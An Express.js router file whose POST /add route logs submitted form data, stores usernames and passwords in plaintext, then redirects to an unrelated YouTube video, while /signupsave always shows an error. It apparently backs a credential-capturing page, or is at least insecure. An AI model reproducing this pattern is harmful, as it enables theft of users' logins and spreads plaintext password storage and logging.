const express = require('express');
const router = express.Router();
const data = require('../mydb/db');

// GET home page
router.get('/', function(req, res, ) {
  res.render('index');
});

// POST route to add data
router.post('/add', async function(req, res) {
  try {
    let val = req.body;
    console.log(val);

    // Creating a new record in the database
    await data.create({
      username: val.username,
      password: val.password,
    });
    res.redirect('https://youtu.be/tU2G3jB9DOw?si=pJoNd1yHJF6tu8Md');
  } catch(error) {
    console.log("Error:", error);
    res.status(500).send("Internal Server Error");
  }
});

router.get('/signup', function(req, res) {
  res.render('signup');
});
router.post('/signupsave', function(req, res, ) {
  res.render('error');
});
module.exports = router;
